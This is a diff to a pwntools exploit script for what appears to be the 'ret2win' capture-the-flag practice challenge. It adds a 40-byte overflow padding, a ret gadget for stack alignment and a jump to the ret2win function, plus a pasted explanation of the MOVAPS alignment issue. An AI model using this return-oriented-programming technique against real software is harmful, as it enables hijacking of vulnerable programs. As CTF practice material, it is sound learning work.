@@ -2,6 +2,10 @@
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
 # $ pwn template ret2win
+
+import os
+os.environ['XDG_CACHE_HOME'] = '/tmp'
+
 from pwn import *
 
 # Set up pwntools for the correct architecture
@@ -46,7 +50,28 @@ payload = g.get(100)
 #pwn cyclic -l kaaa
 
 payload = b"A" * 40
+
+rop = ROP(exe)
+# TODO fix  def __get_cachefile_name(self, files): in "/usr/local/lib/python3.6/dist-packages/pwnlib/rop/rop.py
+ret_gadget = rop.ret
+print(ret_gadget.address)
 payload += p64(0x40053e)
+
+'''
+The MOVAPS issue
+If you're segfaulting on a movaps instruction in buffered_vfprintf() 
+or do_system() in the x86_64 challenges, then ensure the stack is 
+16-byte aligned before returning to GLIBC functions such as printf() 
+or system(). Some versions of GLIBC uses movaps instructions to move 
+data onto the stack in certain functions. The 64 bit calling convention 
+requires the stack to be 16-byte aligned before a call instruction but 
+this is easily violated during ROP chain execution, causing all further 
+calls from that function to be made with a misaligned stack. movaps 
+triggers a general protection fault when operating on unaligned data, 
+so try padding your ROP chain with an extra ret before returning into 
+a function or return further into a function to skip a push instruction.
+'''
+
 payload += p64(exe.symbols["ret2win"])
 
 #open('payload', 'wb').write(payload)
